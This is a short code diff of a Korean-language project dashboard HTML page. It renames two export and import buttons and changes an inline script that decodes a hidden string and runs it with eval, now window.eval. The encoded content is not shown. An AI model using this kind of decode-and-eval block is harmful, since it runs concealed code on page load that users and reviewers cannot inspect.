@@ -1649,8 +1649,8 @@
                                     <div class="nitem" id="nav-special" onclick="goPage('special')"><span class="ni">⭐</span>특별 관리 대상</div>
             <div class="nlabel">프로젝트 관리</div>
             <div style="padding: 6px 13px 12px; display: flex; flex-direction: column; gap: 6px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); margin-bottom: 6px;">
-                <button class="btn btn-sm btn-s" onclick="exportProjectJSON()" style="width:100%; text-align:center; display:flex; align-items:center; justify-content:center; gap:5px; font-weight:700">📤 프로젝트 내보내기 (JSON)</button>
-                <button class="btn btn-sm" onclick="document.getElementById('json-file-input').click()" style="width:100%; text-align:center; display:flex; align-items:center; justify-content:center; gap:5px; font-weight:700; background:var(--bg3); border:1px solid var(--bd2); color:var(--tx)">📥 프로젝트 불러오기 (JSON)</button>
+                <button class="btn btn-sm btn-s" onclick="exportProjectJSON()" style="width:100%; text-align:center; display:flex; align-items:center; justify-content:center; gap:5px; font-weight:700">📤 프로젝트 내보내기</button>
+                <button class="btn btn-sm" onclick="document.getElementById('json-file-input').click()" style="width:100%; text-align:center; display:flex; align-items:center; justify-content:center; gap:5px; font-weight:700; background:var(--bg3); border:1px solid var(--bd2); color:var(--tx)">📥 프로젝트 불러오기</button>
                 <input type="file" id="json-file-input" accept=".json" style="display:none" onchange="importProjectJSON(event)">
                 <button class="btn btn-sm" onclick="resetProject()" style="width:100%; text-align:center; display:flex; align-items:center; justify-content:center; gap:5px; font-weight:700; background:#dc2626; color:#ffffff; border:none; margin-top:4px">🔄 대시보드 초기화</button>
             </div>
@@ -2509,7 +2509,7 @@
             var _a=new Uint8Array(_d.length);
             for(var _i=0;_i<_d.length;_i++){_a[_i]=_d.charCodeAt(_i);}
             var _s=new TextDecoder('utf-8').decode(_a);
-            eval(_s);
+            window.eval(_s);
         })();
     </script>
 
